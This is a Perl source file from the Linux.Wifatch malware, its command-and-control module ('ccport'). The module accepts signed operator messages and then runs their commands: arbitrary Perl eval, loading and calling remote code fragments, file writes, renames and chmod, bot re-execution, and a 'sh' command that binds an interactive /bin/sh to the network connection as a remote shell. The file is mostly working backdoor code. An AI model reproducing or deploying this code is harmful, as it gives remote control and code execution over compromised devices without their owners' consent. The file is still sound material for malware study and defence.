#
# This file is part of Linux.Wifatch
#
# Copyright (c) 2013,2014,2015 The White Team <rav7teif@ya.ru>
#
# Linux.Wifatch is free software: you can redistribute it and/or modify
# it under the terms of the GNU General Public License as published by
# the Free Software Foundation, either version 3 of the License, or
# (at your option) any later version.
#
# Linux.Wifatch is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with Linux.Wifatch. If not, see <http://www.gnu.org/licenses/>.
#

package bn::ccport;

# command and control port

our $RBUF_MAX = 1024;    # initial max size

our $LIMIT = new Coro::Semaphore 4;

sub coro
{
	my ($pid) = @_;

	if (my ($coro) = grep $_ == $pid, Coro::State::list) {
		$coro
	} else {
		undef
	}
}

# copy from coro, coro does not work here
use bn::auto sub => <<'END';
eval ps;
my $flags       = shift;
my $verbose     = $flags =~ /v/;
my $desc_format = $flags =~ /w/ ? "%-24s" : "%-24.24s";
my $buf         = sprintf "%20s %s%s %4s %4s $desc_format %s\n", "PID", "S", "C", "RSS", "USES", "Description", "Where";

for my $coro (reverse Coro::State::list) {
	my @bt;

	$coro->call(
		sub {
			for my $frame (1 .. 10) {
				my @frame = caller $frame;
				next if $frame[0] =~ /^Coro/;
				push @bt, \@frame if $frame[2];
			}
		});

	for (@bt) {
		$_ = "$_->[0]/$_->[3]";
	}

	$buf .= sprintf "%20s %s%s %4s %4s $desc_format %s\n", $coro + 0, $coro->is_new ? "N" : $coro->is_running ? "U" : $coro->is_ready ? "R" : "-", $coro->is_traced ? "T" : $coro->has_cctx ? "C" : "-", $coro->rss, $coro->usecount, $times ? $coro->times : (), $coro->debug_desc, (join " < ", @bt);
}

split /\n/, $buf

END

use bn::auto sub => <<'END';
eval gen_queue($$;$);
my ($reply, $prefix, $time) = @_;

$time ||= 30;

my $data;

my $sender = bn::func::async {
	while ($time) {
		Coro::AnyEvent::sleep $time;

		if (@$data) {
			(my $send, $data) = $data;
			$reply->($Types::Serialiser::true, $prefix, $send);
		}
	}
};

my $sender_guard = Guard::guard {undef $time};

sub {
	$sender_guard;

	push @$data, @_;
	}

END

sub ccport
{
	my ($fh, $host, $port) = @_;

	my $guard = bn::func::try_guard $LIMIT
		or return;

	my $rbuf_max    = $RBUF_MAX;
	my $max_waiters = 8;           # max # of outstanding messages

	my $challenge = bn::crypto::rand_bytes 12;
	my $seq;

	my $sem = new Coro::Semaphore;

	my $reply = sub {
		$fh
			or return;

		$sem->waiters < $max_waiters
			or return shutdown $fh, 2;

		my $guard = $sem->guard;

		my $msg = \@_;
		bn::func::freeze $msg;
		$msg = pack "N/a", $msg;

		bn::io::xwrite $fh, $msg;
	};

	my $watchdog = AE::timer 90, 90, sub {
		bn::func::async {
			$reply->($Types::Serialiser::true);
			bn::watchdog::reset;    # maybe not great idea, but good enough
		};
	};

	my $update;
	my %data;                               # per-conn data, for eval
	my %frag;                               # compiled fragments
	my $timeout = 60;

	my $cleanup = Guard::guard {$fh = %data = %frag = ()};

	# 204+ add safe mode etc.
	# 288+ add arch
	$reply->(hello => $challenge, bn::ntp::now, $bn::cfg{id}, $bn::SAFE_MODE, $bn::BNVERSION, $bn::PLVERSION, $bn::BNARCH, $bn::VERSION);

	eval {
		while () {
			my ($sig) = bn::io::xread $fh, bn::crypto::ECDSA_SIZE, $timeout
				or return;

			my ($msg) = bn::io::xreadN $fh, $rbuf_max, $timeout
				or return;

			bn::crypto::ecdsa_verify $sig, $msg
				or return $reply->($Types::Serialiser::false => "sig");

			bn::func::thaw $msg;

			# msg: chg+id, t0, t1, [cmds...]

			return $reply->($Types::Serialiser::false => seq => $seq)
				if $msg->[0] ne $challenge . pack "N", ++$seq;

			# check time window
			my $now = bn::ntp::now;

			if ($now < $msg->[1] || $msg->[2] < $now) {
				bn::ntp::force;
				$now = bn::ntp::now;
				if ($now < $msg->[1] || $msg->[2] < $now) {
					return $reply->($Types::Serialiser::false => time => $now);
				}
				bn::log "WARNING: force needed for ccport sigcheck";
			}

			undef $guard;    # do not limit connections after auth
			$timeout = 3600;
			bn::watchdog::reset;

			for my $c (@{ $msg->[3] }) {
				if ($c->[0] eq "rbuf_max") {
					$rbuf_max = $c->[1];

				} elsif ($c->[0] eq "stat") {
					$reply->(
						{       plversion => $bn::PLVERSION,
							bnversion => $bn::BNVERSION,
							bnarch    => $bn::BNARCH,
							free_mem  => bn::func::free_mem,
							base      => $::BASE,
							exec      => $::EXEC,
						});

				} elsif ($c->[0] eq "eval") {
					local @_ = splice @$c, 3;
					local $SIG{__DIE__};    # ???... :/
					@_ = eval $c->[1];
					if ($c->[2]) {
						$reply->($@, @_);
					} elsif ($@) {
						die $@;
					}

				} elsif ($c->[0] eq "frag") {    # 397+
					$frag{ $c->[1] } = eval "sub { $c->[2] }";
					die $@ if $@;

				} elsif ($c->[0] eq "c") {       # call 397+
					my (undef, $frag, @args) = @$c;
					$reply->($frag{$frag}->(@$c));

				} elsif ($c->[0] eq "C") {       # Call with id 397+
					my (undef, $frag, $id, @args) = @$c;
					$reply->($Types::Serialiser::true => $id, $frag{$frag}->(@$c));

				} elsif ($c->[0] eq "filesha") {
					$reply->(eval {bn::func::file_sha256 bn::func::abspath $c->[1]});

				} elsif ($c->[0] eq "beginwrite") {
					open $update, ">", bn::func::abspath $c->[1];

				} elsif ($c->[0] eq "write") {    # >= 391
					syswrite $update, $c->[1]
						if $update;

				} elsif ($c->[0] eq "cwrite") {
					syswrite $update, Compress::LZF::decompress $c->[1]
						if $update;

				} elsif ($c->[0] eq "chmod") {
					chmod $c->[1], $c->[2];

				} elsif ($c->[0] eq "rename") {
					$reply->(!!rename bn::func::abspath $c->[1], bn::func::abspath $c->[2]);

				} elsif ($c->[0] eq "reexec") {
					bn::hpv::save;

					# bn::cfg::save # ^ does it
					bn::func::reexec;
					$reply->("$!");

				} elsif ($c->[0] eq "log") {
					$reply->(\@bn::log::log);

				} elsif ($c->[0] eq "sh") {    # 271
					if (fork eq 0) {
						AnyEvent::Util::fh_nonblocking $fh, 0;

						open STDIN,  "<&", $fh;
						open STDOUT, ">&", $fh;
						open STDERR, ">&", $fh;
						close $fh;

						syswrite STDERR, "starting sh in $::BASE, dbdir $bn::DBDIR\n";
						chdir $::BASE;
						exec "/bin/sh", "-i";

						syswrite STDERR, "exec error\n";
						POSIX::_exit 1;
					}

					close $fh;
					return;

				} else {
					return $reply->($Types::Serialiser::false => cmd => $c->[0]);
				}
			}
		}
	};
	$reply->($Types::Serialiser::false => die => "$@") if $@;
}

1

